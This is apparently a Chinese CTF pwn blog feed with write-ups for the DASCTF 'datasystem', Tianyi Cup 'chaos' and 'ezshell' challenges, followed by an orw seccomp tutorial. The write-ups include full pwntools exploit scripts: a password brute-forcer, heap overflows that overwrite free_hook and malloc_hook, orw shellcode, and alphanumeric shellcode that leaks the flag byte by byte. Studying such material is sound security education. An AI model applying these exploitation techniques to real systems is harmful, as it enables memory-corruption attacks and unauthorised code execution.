<h2 id="datasystem"><a href="#datasystem" class="headerlink" title="datasystem"></a>datasystem</h2><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928153319183.png"><span class="image-caption">image-20210928153319183</span></p>
<p>checksec，64位保护全开</p>
<p>这题是三题里面最复杂的一题，因为在进入真正的程序前，有一个登陆程序，比较复杂，需要花时间进行审计</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928154615068.png"><span class="image-caption">image-20210928154615068</span></p>
<p>开了沙箱</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928162959918.png"><span class="image-caption">image-20210928162959918</span></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928163032723.png"><span class="image-caption">image-20210928163032723</span></p>
<p>一进入，要先输入账号和密码通过验证，验证通过才能进入真正的有漏洞的程序。账号已经给：admin；密码要自己去找</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928165344870.png"><span class="image-caption">image-20210928165344870</span></p>
<p>我先断点断在比较函数那，看看最终比较的值，第一个参数是我们输入的（原本输入的是八个a），第二个就是要比较的密码。然后我把下一次输入的值换成这个密码</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928165946197.png"><span class="image-caption">image-20210928165946197</span></p>
<p>发现，第二个参数的第一个字符变成了0，那不是截断了吗？但是并没有通过验证，然后我去c代码敲了下，原来是要两个字符串同时都是’\x00’才会通过比较，一个是不行的~</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928170846837.png"><span class="image-caption">image-20210928170846837</span></p>
<p>然后又试了一些随便输入的密码，惊讶的发现，得到的验证密码结果都是一样的，只有复制的密码那次会出现0，看了下wp，大佬推测是位数的问题，只有32位的数字才能让密码为0，我试了下确实是这样的，接下来就是寻找一个可以也让我们输入的密码被加密成首位是’\x00’就可以通过验证</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;error&quot;</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>    c = c.to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;big&#x27;</span>)<br>    p = process(<span class="hljs-string">&#x27;./datasystem&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;please input username: &quot;</span>, <span class="hljs-string">&quot;admin\x00&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;please input password: &quot;</span>, c*<span class="hljs-number">32</span>)<br>    msg = p.recvline()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Fail&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> msg:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">60</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a valid char:&quot;</span>, c)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">60</span>)<br>    p.close()<br></code></pre></td></tr></table></figure>

<p>这是大佬的爆破脚本，最终获得两个可以通过的值：’c’和’\xec’。然后大佬是用IDA调试的，我以前有尝试过，但是无奈一直报错，但是gdb调试也是一样的，没差</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928171601841.png"><span class="image-caption">image-20210928171601841</span></p>
<p>进入下一个程序了</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928190830374.png"><span class="image-caption">image-20210928190830374</span></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928190852013.png"><span class="image-caption">image-20210928190852013</span></p>
<p>这边v3返回值因为%s的缘故会把byte_50A0指向的字符全部作为欲写入的字符，而byte_50A0可以查看，全都是a，似乎有0x508个，所以这边在add写入的内容是溢出的。</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928193027743.png"><span class="image-caption">image-20210928193027743</span></p>
<p>万事先泄露libc，这边要先申请再释放一个0x410的堆块，防止进入tcache bin中，然后再申请的得是0x8大小的堆块，因为snprinf会打印个数进去，不能超过八个，否则会把上面残留的bk指针破坏，从而可以泄露出libc地址</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928193842290.png"><span class="image-caption">image-20210928193842290</span></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928194236357.png"><span class="image-caption">image-20210928194236357</span></p>
<p>然后再反序释放三个堆块，申请回来，就会让上面的堆块是最先被申请的，然后通过溢出把堆块分配到0x23330000写入shellcode，之前再来一遍把fd指针为free_hook，申请过去改为shellcode地址，然后释放一个堆块就会跳转执行shellcode了</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928200129108.png"><span class="image-caption">image-20210928200129108</span></p>
<p>成功！</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928203049261.png"><span class="image-caption">image-20210928203049261</span></p>
<p>不容易，有朝一日我这小菜鸡竟然能赛后“ak”，泪目！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./datasystem&quot;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./datasystem&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27961</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Size: \n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;what&#x27;s your Content: \n&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Content:\n&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.recvuntil(<span class="hljs-string">&quot;please input username: &quot;</span>)<br>p.send(<span class="hljs-string">&quot;admin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;please input password: &quot;</span>)<br>p.send(<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x410</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;c&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ec090</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x23330000</span>)<br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">	mov rdi, 0x23330000</span><br><span class="hljs-string">	xor rsi, rsi</span><br><span class="hljs-string">	mov rax, 2</span><br><span class="hljs-string">	syscall</span><br><span class="hljs-string">	</span><br><span class="hljs-string">	mov rdi, rax</span><br><span class="hljs-string">	mov rsi, rsp</span><br><span class="hljs-string">	mov rdx, 0x50</span><br><span class="hljs-string">	xor rax, rax</span><br><span class="hljs-string">	syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">	mov rdi, 1</span><br><span class="hljs-string">	mov rax, 1</span><br><span class="hljs-string">	syscall	</span><br><span class="hljs-string">	&#x27;&#x27;&#x27;</span><br>)<br>add(<span class="hljs-number">0x60</span>, payload)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span> + shellcode)<br><br>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;c&#x27;</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x21</span>) + p64(free_hook))<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>, p64(<span class="hljs-number">0x23330000</span> + <span class="hljs-number">0x8</span>))<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>2021天翼杯PWN</title>
    <url>/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太菜了，一题没出；又是抱着大佬WP跟着复现~</p>
<p>来源：<a href="http://www.darry-long.top/2021/09/23/2021-%E5%A4%A9%E7%BF%BC%E6%9D%AF-pwn/">http://www.darry-long.top/2021/09/23/2021-%E5%A4%A9%E7%BF%BC%E6%9D%AF-pwn/</a></p>
<h2 id="chaos"><a href="#chaos" class="headerlink" title="chaos"></a>chaos</h2><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926091254408.png"><span class="image-caption">image-20210926091254408</span></p>
<p>常规checksec，64位保护全开</p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926100956854.png"><span class="image-caption">image-20210926100956854</span></p>
<p>第一次进行比较长的代码审计，对我来说还是比较困难的，基本上都是跟着大佬的注释边写边考虑逻辑</p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926101234190.png"><span class="image-caption">image-20210926101234190</span></p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926101445271.png"><span class="image-caption">image-20210926101445271</span></p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926110301065-16326298376511.png"><span class="image-caption">image-20210926110301065</span></p>
<p>这保存的是一个单链表结构，在每个申请出来的堆块上的0x210保存在前一个堆块的地址，在0x208处保存着当前堆块可写入的数据的长度，所以是存在堆溢出的，修改了size就可以修改保存堆块的地址，变成任意地址写或者修改下一块堆块的堆头、fd\bk指针等。因为是单向链表结构，所以是一个一个追溯的，越晚申请的堆块序号越靠前，但是在堆上的地址其实是靠后的</p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926121301503.png"><span class="image-caption">image-20210926121301503</span></p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926121807097.png"><span class="image-caption">image-20210926121807097</span></p>
<p>最终在我本地调为符合one_gadget的环境要求，可是不知道为什么最终却没有getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./chall&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(<span class="hljs-string">&quot;opcode:1\npasswd:Cr4at31\n\r\r\n&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(<span class="hljs-string">&quot;opcode:3\npasswd:Ed1t1\n\r\r\n&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(<span class="hljs-string">&quot;opcode:2\npasswd:SH0w1\n\r\r\n&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(<span class="hljs-string">&quot;opcode:4\npasswd:D3l4te1\n\r\r\n&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>add(<span class="hljs-number">0x208</span>, <span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x208</span>)<br>add(<span class="hljs-number">0x208</span>, <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x208</span>)<br>add(<span class="hljs-number">0x208</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x4c0</span><br>log.info(<span class="hljs-string">&quot;heap_addr==&gt;0x%x&quot;</span> %heap_addr)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>	add(<span class="hljs-number">0x208</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>) <span class="hljs-comment">#新申请的为0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>	free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>) <span class="hljs-comment">#0</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span> + p64(heap_addr + <span class="hljs-number">0x2e0</span>))<br>show(<span class="hljs-number">1</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4f432</span><br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span> + p64(mlh - <span class="hljs-number">0x8</span>))<br>edit(<span class="hljs-number">1</span>, p64(ogg) + p64(realloc + <span class="hljs-number">9</span>))<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opcode:1\npasswd:Cr4at31\n\r\r\n&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="ezshell"><a href="#ezshell" class="headerlink" title="ezshell"></a>ezshell</h2><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20211003091318701.png"><span class="image-caption">image-20211003091318701</span></p>
<p>程序很简单，总的说就是输入内容，然后转移到可执行的地址上去执行。</p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20211003091835842.png"><span class="image-caption">image-20211003091835842</span></p>
<p>然后开启了沙箱，只允许使用 open 和 read 函数，同时要求 read 函数的 fd 参数右移32位后仍然大于0或者是大等.于4</p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20211003091716855.png"><span class="image-caption">image-20211003091716855</span></p>
<p>可写可执行段在0x10000~0x11000</p>
<p>首先orw是没跑了，但是没有write，所以只能是逐字节进行爆破的思想：根据是否异常区分爆破的字符对错。但是我愣是没做出来，算了，思想知道就行，官方wp我跑了本地也没出，差评！</p>
<p>贴个官方的wp好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br><span class="hljs-keyword">from</span> ae64 <span class="hljs-keyword">import</span> AE64  <br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;DEBUG&#x27;</span>]:  <br>    context.log_level = <span class="hljs-string">&quot;debug&quot;</span>  <br>code = ELF(<span class="hljs-string">&quot;./chall&quot;</span>)  <br>context.arch=code.arch  <br>  <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">payload</span>(<span class="hljs-params">idx, ch</span>):</span>  <br>    tmp = <span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27; </span><br><span class="hljs-string">    open_sec: </span><br><span class="hljs-string">            xor rax, rax </span><br><span class="hljs-string">            add al, 2 </span><br><span class="hljs-string">            jmp x </span><br><span class="hljs-string">        y:  pop rdi </span><br><span class="hljs-string">            xor rsi,rsi </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">            xor rax, rax </span><br><span class="hljs-string">            add al, 2 </span><br><span class="hljs-string">            jmp p </span><br><span class="hljs-string">        q:  pop rdi </span><br><span class="hljs-string">            xor rsi,rsi </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">            push rax </span><br><span class="hljs-string">            pop rdi </span><br><span class="hljs-string">            xor rax, rax </span><br><span class="hljs-string">            xor rdx, rdx </span><br><span class="hljs-string">            add dl, 0xff </span><br><span class="hljs-string">            mov rsi, rsp </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">            mov al, [rsp+&#123;&#125;] </span><br><span class="hljs-string">            cmp al, &#123;&#125; </span><br><span class="hljs-string">            jne tmp </span><br><span class="hljs-string">            jmp $ </span><br><span class="hljs-string">        tmp: </span><br><span class="hljs-string">            xor rax,rax  </span><br><span class="hljs-string">            add al,60 </span><br><span class="hljs-string">            xor rdi,rdi </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">        x: </span><br><span class="hljs-string">            call y </span><br><span class="hljs-string">            .string &quot;./flag&quot; </span><br><span class="hljs-string">        p: </span><br><span class="hljs-string">            call q </span><br><span class="hljs-string">            .string &quot;./flag&quot; </span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(idx, <span class="hljs-built_in">ord</span>(ch))  <br>  <br>    shellcode = asm(tmp)  <br>    <span class="hljs-comment"># get alphanumeric shellcode  </span><br>      <br>    <span class="hljs-keyword">return</span> AE64().encode(shellcode, <span class="hljs-string">&#x27;rdx&#x27;</span>).decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)  <br>  <br>flag = <span class="hljs-string">&#x27;&#x27;</span>  <br>i = <span class="hljs-number">0</span>  <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> string.printable:  <br>        conn = process(<span class="hljs-string">&quot;./chall&quot;</span>)    <br>        conn.sendlineafter(<span class="hljs-string">&quot;?\n&quot;</span>, payload(i, x))  <br>        <span class="hljs-keyword">try</span>:  <br>            conn.recv(<span class="hljs-number">1</span>, timeout=<span class="hljs-number">1</span>)  <br>        <span class="hljs-keyword">except</span> EOFError:  <br>            conn.close()  <br>            <span class="hljs-keyword">continue</span>  <br>        <span class="hljs-built_in">print</span>(flag,i)  <br>        flag += x  <br>        i += <span class="hljs-number">1</span>  <br>        conn.close()  <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> flag:  <br>            <span class="hljs-built_in">print</span>(flag)  <br>            exit()  <br>        <span class="hljs-keyword">break</span>  <br>  <br>conn.interactive()  <br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>orw</title>
    <url>/2021/09/21/2021-09-21-orw/</url>
    <content><![CDATA[<h2 id="背景前置"><a href="#背景前置" class="headerlink" title="背景前置"></a>背景前置</h2><p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。</p>
<p><code>orw_seccomp函数</code>执行了两次<code>prctl</code>函数（出现prctl就是沙箱的题目）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell">第一次调用prctl函数 ————禁止提权<br>第二次调用prctl函数 ————限制能执行的系统调用只有open，<span class="hljs-built_in">write</span>，<span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>

<p>意思就是我们不能使用特殊的系统调用getshell，但是可以用open、read、write三个系统调用去读flag</p>
<h2 id="入门级orw"><a href="#入门级orw" class="headerlink" title="入门级orw"></a>入门级orw</h2><h3 id="一、pwnable-orw"><a href="#一、pwnable-orw" class="headerlink" title="一、pwnable_orw"></a>一、pwnable_orw</h3><p>来自buu上的</p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522121233.png"></p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522121208.png"></p>
<p>首先checksec完，发现只开了canary，放入ida看看。发现，可以输入数据，然后还能对输入的数据进行执行调用。因为这开启沙箱，系统调用是无法执行的，只能通过open打开flag，然后read读到缓冲区上，再通过write泄露出来，从而得到flag</p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522122706.png"></p>
<p>第一个exp是自己去构造执行指令，第二个是用pwntool里面自带的shellcraft的功能。相比之下，第二个会更方便许多</p>
<p>exp的详细解析：（来自<a href="https://blog.csdn.net/qq_44768749/article/details/108256099%EF%BC%89">https://blog.csdn.net/qq_44768749/article/details/108256099）</a></p>
<p>打开flag文件，sys_open(file,0,0)；系统调用号为5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">push 0x0  			#字符串结尾<br>push 0x67616c66		#&#x27;flag&#x27;<br>mov ebx,esp			<br>xor ecx,ecx			#0<br>xor edx,edx			#0<br>mov eax,0x5			#调用号<br>int 0x80			#sys_open(flags,0,0)<br></code></pre></td></tr></table></figure>

<p> 读flag文件，sys_read(3,file,0x100)；系统调用号为3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">mov eax,0x3; <br>mov ecx,ebx;	# ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”<br>mov ebx,0x3;	# 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件<br>mov edx,0x100;	#对应字节数<br>int 0x80;<br></code></pre></td></tr></table></figure>


<p>输出flag文件内容，sys_write(1,file,0x30)；系统调用号为4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">mov eax,0x4;	# eax = sys_write<br>mov ebx,0x1;	# ebx = unsigned int fd = 1<br>int 0x80;<br></code></pre></td></tr></table></figure>

<p>exp1</p>
